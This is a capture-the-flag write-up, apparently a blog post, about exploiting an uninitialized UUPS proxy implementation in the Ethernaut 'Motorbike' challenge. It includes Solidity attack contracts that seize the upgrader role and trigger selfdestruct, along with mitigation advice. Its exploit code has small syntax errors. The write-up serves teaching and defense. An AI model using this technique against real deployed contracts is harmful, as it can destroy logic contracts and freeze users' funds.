---
title: Bad Proxies
date:  2022-11-06 12:30:06
author: Vishvesh
author_url: https://twitter.com/The_Str1d3r
mathjax: true
categories:
  - Blockchain
  - CTF-Writeups
tags:
  - "Ethereum"
  - "Solidity"

url : https://hackmd.io/Cyo2eYrKQPSvN3Zp8pga9g?view
mermaid: true
---
<html>
  <head>
    <script type="text/javascript" async
  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML">
    </script>


<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS_HTML">
  MathJax.Hub.Config({
    "HTML-CSS": {
      availableFonts: ["TeX"],
    },
    tex2jax: {
      inlineMath: [['$','$'],["\\(","\\)"]]},
      displayMath: [ ['$$','$$'], ['\[','\]'] ],
    TeX: {
      extensions: ["AMSmath.js", "AMSsymbols.js", "color.js"],
      equationNumbers: {
        autoNumber: "AMS"
      }
    },
    showProcessingMessages: false,
    messageStyle: "none",
    imageFont: null,
    "AssistiveMML": { disabled: true }
  });
</script>
</head>
</html>

------
# Motorbike

## Overview

This challenge requires some pre requisites regarding upgradable smart contracts and differentmethods used to achieve this.

This challenge is based on the ***uups** (Universal Upgradeable Proxy Standard)* upgradeable pattern in this instead of the proxy contract containing the upgradable logic the implementaion contract itself has the upgrading logic coded into it.

Another unique feature of this pattern is the security it provides agains storage collision. To avoid clashes in storage usage between the proxy and logic contract, the address of the logic contract is typically saved in a specific storage slot (for example `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`) guaranteed to be never allocated by a compiler. 

We can see this defined in the challenge contract. In our case the proxy contract is the `Motorbike` contract and the Engine contract is the implementation contract.

Now our goal is basically to call `selfdestruct()` on the implementation thereby making the proxy unusable.

## Analysing Contracts

Now lets have a lok at the implementaion contract...

### Engine



```solidity
contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```
This contract has no way to call the `selfdestruct()` function in it.
In order to call it we will have to declare our own implementaion with the function declared in it.

To do that we will need to update the implementation contract to ours. Looking at `Engine` we can see there is a fucntion to do just that: `upgradeToAndCall()`.

This function calls the ` _authorizeUpgrade()` function inside it which chekcs to see if we have the necessary authentication to change implementation contracts address. Only if we are the ***upgrader***      can we change the address.

So how is the ***upgrader*** address determined..? The address which calls the `initialize()` function becomes the ***upgrader*** , this is meant to be called by the proxy contract.

Lets have a look at the proxy contract....

### Motorbike

```solidity
contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}
```

Here we can see that proxy contract indeed calls the initialize function and as we knoe the intilaize function can only be called once.

So if are to become the upgrader we would have to somehow call the `intialize()` function and it should be the first time its being called.

So how do we go about this...

## Constructing the exploit

What we need to understand here is that 
- The intialize() function has no access control and anyone is free to call it as long as two things are satisfied..
    - We need the address of the current implementaion contract so that we can call intialize() on it.
    - We should be the first one to call intialize()

The first problem to get the address, we know the address is stored at the above mentioned storage location so we just input the following query into the console..

```javascript
await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
```

Now regarding the second problem, the proxy contract would have already called the `initialize()` function when it was deployed so how that means its been already called and we cant call it now ryt...?

Well looking closely at the `Mototrbike` contract we see that its constructor performs a delegatecall on `Engine` to call `intialize(`)
this means that what ever storage variable change it changes in the context of the proxy contract and not that of the implementaion, including the variable which keeps track of if `intialze()` has been called or not.

So in the context of Engine `intialize()` has never been called and so a simple call to it from our `Attack` contract will make our contract the upgrader and then we just need to load the address of our custom implementation contract containing the `selfdestruct()` fucntion, which we can then call.

## Exploit


We will need two contracts..

### Custom Implementation contract..


```solidity
contract SelfDestruct {
    
    function exploit() external{
        selfdestruct(address(0))
    }
```

### The exploit contract...

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    
    Engine engine = Engine(_EngineAddress);
    
    function upgrade() external{
        
        engineAddress.initialize();
        bytes memory encodedData = abi.encodeWithSignature("exploit()");
        engineAddress.upgradeToAndCall(_selfDestrucAddress, encodedData);
    }
}
```
## Mitigation
- Make sure to guard sensetive and application critical function with access modifiers.
- Always be mindfull of the context in which a fucntion is being called and where the state variables are stored and modified.
